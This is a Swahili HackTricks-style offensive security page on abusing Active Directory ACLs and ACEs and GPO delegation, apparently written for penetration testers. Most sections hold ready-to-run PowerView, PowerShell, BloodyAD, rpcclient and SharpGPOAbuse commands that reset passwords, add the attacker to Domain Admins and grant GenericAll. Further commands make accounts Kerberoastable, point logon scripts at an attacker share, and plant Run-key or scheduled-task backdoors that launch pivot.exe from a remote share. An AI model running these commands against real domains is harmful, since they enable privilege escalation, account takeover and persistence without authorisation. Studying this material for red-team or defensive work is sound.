# Kutumia Vibaya Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asili.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Haki za GenericAll kwa Mtumiaji**

Haki hii inampa mshambuliaji udhibiti kamili wa akaunti ya mtumiaji anayelengwa. Mara haki za `GenericAll` zinapothibitishwa kwa kutumia amri ya `Get-ObjectAcl`, mshambuliaji anaweza:

- **Badilisha Nenosiri la Lengo**: Kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kuweka upya nenosiri la mtumiaji.
- **Targeted Kerberoasting**: Kuweka SPN kwenye akaunti ya mtumiaji ili kuiifanya kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja hash za ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, ukifanya akaunti yao iwe hatarini kwa ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Haki za GenericAll kwenye Kundi**

Haki hii inamwezesha mshambuliaji kubadilisha uanachama wa vikundi ikiwa ana haki za `GenericAll` kwenye kundi kama `Domain Admins`. Baada ya kutambua distinguished name ya kundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:

- **Kujiongeza kwenye kundi la `Domain Admins`**: Hii inaweza kufanywa kupitia amri za moja kwa moja au kwa kutumia modules kama Active Directory au PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Kutoka Linux unaweza pia kutumia BloodyAD kujiongezea kwenye vikundi vyovyote endapo una uanachama wa GenericAll/Write juu yao. Ikiwa kundi lengwa limejumuishwa ndani ya “Remote Management Users”, utapata mara moja ufikiaji wa WinRM kwenye hosts zinazoheshimu kundi hilo:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na ruhusa hizi kwenye kitu cha kompyuta au akaunti ya mtumiaji kunaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa kitu cha kompyuta.
- **Shadow Credentials**: Tumia mbinu hii kuiga kompyuta au akaunti ya mtumiaji kwa kutumia ruhusa kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa mtumiaji ana haki za `WriteProperty` kwenye vitu vyote vya kikundi fulani (mfano, `Domain Admins`), wanaweza:

- **Kujiongeza kwenye kikundi la Domain Admins**: Inaweza kufikiwa kwa kuchanganya amri za `net user` na `Add-NetGroupUser`; mbinu hii inaruhusu kupandisha hadhi ya ruhusa ndani ya domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Haki hii inawawezesha washambuliaji kujiongeza wenyewe kwa vikundi maalum, kama `Domain Admins`, kupitia amri zinazobadilisha uanachama wa kikundi moja kwa moja. Kutumia mfululizo wa amri ufuatao kunaruhusu kujiongeza mwenyewe:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Haki inayofanana, hii inawawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha sifa za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa na:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kushikilia `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu kuweka nywila upya bila kujua nywila ya sasa. Uhakiki wa haki hii na exploitation yake yanaweza kufanywa kupitia PowerShell au zana nyingine za mstari wa amri, zikitoa mbinu kadhaa za kuweka upya nywila ya mtumiaji, ikijumuisha interactive sessions na one-liners kwa mazingira yasiyo ya kuingiliana. Amri zinaanzia kutoka miito rahisi za PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionyesha utofauti wa attack vectors.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner kwenye kikundi**

Iwapo mshambuliaji atagundua kwamba ana haki za `WriteOwner` kwa kikundi, anaweza kubadilisha umiliki wa kikundi kwa ajili yake mwenyewe. Hii ina athari kubwa hasa wakati kikundi kinachohusika ni `Domain Admins`, kwa kuwa kubadilisha umiliki kunaruhusu udhibiti mpana wa sifa za kikundi na uanachama. Mchakato unajumuisha kutambua kitu sahihi kwa kutumia `Get-ObjectAcl` na kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, ama kwa SID au kwa jina.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite kwa User**

Ruhusa hii inamruhusu attacker kubadilisha sifa za User. Hasa, kwa kupata ruhusa ya `GenericWrite`, attacker anaweza kubadilisha njia ya logon script ya User ili kuendesha script hasidi wakati User anapofanya logon. Hii inafikiwa kwa kutumia amri ya `Set-ADObject` kusasisha mali ya `scriptpath` ya User lengwa ili kuonyesha kwenye script ya attacker.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Kwa ruhusa hii, wadukuzi wanaweza kubadili uanachama wa group, kama vile kujiongezea wenyewe au watumiaji wengine katika vikundi maalum. Mchakato huu unajumuisha kuunda credential object, kuitumia kuongeza au kuondoa watumiaji kutoka kwenye group, na kuthibitisha mabadiliko ya uanachama kwa amri za PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Kumiliki kitu cha AD na kuwa na ruhusa za `WriteDACL` juu yake kunamwezesha attacker kujipa ruhusa za `GenericAll` juu ya kitu hicho.  

Hii inafikiwa kupitia ADSI manipulation, ikiruhusu udhibiti kamili wa kitu hicho na uwezo wa kubadilisha uanachama wake wa vikundi. Hata hivyo, kuna vikwazo vinavyopo unapo jaribu exploit ruhusa hizi kwa kutumia Active Directory module's `Set-Acl` / `Get-Acl` cmdlets.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Kurudishana kwenye Domain (DCSync)**

Shambulio la DCSync linatumia ruhusa maalum za replication kwenye domain ili kujigania kuwa Domain Controller na kusawazisha data, pamoja na kredenshiali za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, ikiruhusu washambuliaji kutoa taarifa nyeti kutoka kwa mazingira ya AD bila kupata ufikiaji wa moja kwa moja kwenye Domain Controller. [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)

## Ugawaji wa GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Ugawaji wa GPO

Ufikiaji uliogawiwa wa kusimamia Group Policy Objects (GPOs) unaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amepewa haki za kusimamia GPO, anaweza kuwa na vibali kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Vibali hivi vinaweza kutumika vibaya kwa madhumuni mabaya, kama inavyobainika kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Kuorodhesha Vibali vya GPO

Ili kubaini GPOs zilizo na usanidi mbaya, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu kugundua GPOs ambazo mtumiaji maalum ana ruhusa za kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta zilizo na Sera Imetumika**: Inawezekana kubaini kompyuta ambazo GPO fulani inatumika, kusaidia kuelewa wigo wa athari zinazowezekana. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zilizotumika kwa Kompyuta Fulani**: Ili kuona ni sera gani zilizotumika kwa kompyuta fulani, amri kama `Get-DomainGPO` zinaweza kutumika.

**OUs zilizo na Sera Iliyotumika**: Kutambua vitengo vya shirika (OUs) vilivyoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.

Unaweza pia kutumia zana [**GPOHound**](https://github.com/cogiceo/GPOHound) kuorodhesha GPOs na kupata matatizo ndani yao.

### Kutumia Vibaya GPO - New-GPOImmediateTask

GPOs zilizo sanidiwa vibaya zinaweza kutumiwa kuendesha code, kwa mfano, kwa kuunda kazi ya ratiba inayotekelezwa mara moja. Hii inaweza kutumika kuongeza mtumiaji kwenye kikundi cha local administrators kwenye mashine zilizoathiriwa, na hivyo kuongeza kwa kiasi kikubwa viwango vya ruhusa:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

The GroupPolicy module, ikiwa imewekwa, inaruhusu uundaji na kuunganisha GPOs mpya, pamoja na kuweka mapendeleo kama registry values ili kutekeleza backdoors kwenye kompyuta zilizoathiriwa. Mbinu hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta ili utekelezaji ufanyike:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse inatoa njia ya abuse GPOs zilizopo kwa kuongeza tasks au kubadilisha settings bila hitaji la kuunda GPOs mpya. Zana hii inahitaji uhariri wa GPOs zilizopo au kutumia RSAT tools kuunda GPOs mpya kabla ya kutekeleza mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Leteza Sasisho la Sera

Sasisho za GPO kwa kawaida hufanyika takriban kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, agizo `gpupdate /force` linaweza kutumika kwenye kompyuta ya lengo ili kulazimisha sasisho la sera mara moja. Agizo hili linahakikisha kuwa marekebisho yoyote ya GPOs yatekelezwa bila kusubiri mzunguko wa sasisho la kiotomatiki.

### Ndani ya Mfumo

Ukikagua Scheduled Tasks za GPO fulani, kama `Misconfigured Policy`, unaweza kuthibitisha kuongezwa kwa kazi kama `evilTask`. Kazi hizi zimeundwa kupitia scripts au zana za command-line zinazolenga kubadilisha tabia za mfumo au kuongeza uwezo wa kusimamisha haki.

Muundo wa kazi, kama vile unaoonyeshwa katika faili ya usanidi ya XML iliyotengenezwa na `New-GPOImmediateTask`, unaelezea maelezo maalum ya kazi iliyopangwa - ikiwa ni pamoja na amri itakayotekelezwa na vichocheo vyake. Faili hii inaonyesha jinsi kazi zilizopangwa zinasainiwa na kusimamiwa ndani ya GPOs, ikitoa njia ya kutekeleza amri au scripts yoyote kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPOs pia huruhusu udhibiti wa uanachama wa watumiaji na vikundi kwenye mifumo ya lengo. Kwa kuhariri faili za sera za Watumiaji na Vikundi moja kwa moja, wadukuzi wanaweza kuongeza watumiaji kwenye vikundi vyenye mamlaka, kama vile kundi la ndani la `administrators`. Hii inawezekana kupitia uteuzi wa ruhusa za usimamizi wa GPO, ambayo inaruhusu mabadiliko ya faili za sera ili kujumuisha watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanidi ya XML kwa Watumiaji na Vikundi inaelezea jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza rekodi kwenye faili hii, watumiaji maalum wanaweza kupewa haki zilizoinuliwa kwa mifumo yote iliyohusishwa. Njia hii inatoa njia ya moja kwa moja ya kuinua hadhi kupitia uhariri wa GPO.

Zaidi ya hayo, mbinu nyingine za kutekeleza msimbo au kudumisha udumishaji, kama vile kutumia logon/logoff scripts, kurekebisha registry keys kwa ajili ya autoruns, kusakinisha software kupitia .msi files, au kuhariri service configurations, pia zinaweza kuzingatiwa. Mbinu hizi zinatoa njia mbalimbali za kudumisha upatikanaji na kudhibiti mifumo ya lengo kupitia unyonyaji wa GPOs.

## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
